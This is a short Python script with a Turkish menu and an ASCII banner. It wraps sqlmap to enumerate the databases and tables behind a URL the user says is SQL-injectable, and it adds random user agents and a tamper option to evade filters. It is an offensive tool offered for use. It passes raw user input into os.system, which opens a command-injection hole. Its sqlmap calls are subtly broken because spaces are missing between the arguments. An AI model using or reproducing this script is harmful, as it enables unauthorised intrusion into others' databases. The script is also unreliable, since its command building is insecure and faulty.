#coded by Sqwares

import os
print("""
╔═╗┌─┐ ┬    ┬┌┐┌ ┬┌─┐┌─┐┌┬┐┬┌─┐┌┐┌
╚═╗│─┼┐│    ││││ │├┤ │   │ ││ ││││
╚═╝└─┘└┴─┘  ┴┘└┘└┘└─┘└─┘ ┴ ┴└─┘┘└┘ Coded by Sqwares

1 - SQL açıklı url'i giriniz 

2 - Tabloları Al ( veri tabanı adı yazmaya gerek yok )
""")

see = input(""" Lutfen Yukardan Birini Seçiniz: """)

if see == "1":
     sql = input("URL : ")
     os.system("sqlmap -u"+sql+" --dbs --random-agent --tamper=space2comment ")

elif see == "2":
    sql2 = input("URL: ")
    os.system("sqlmap -u"+sql2+"--tables --random-agent --tamper=space2comment")
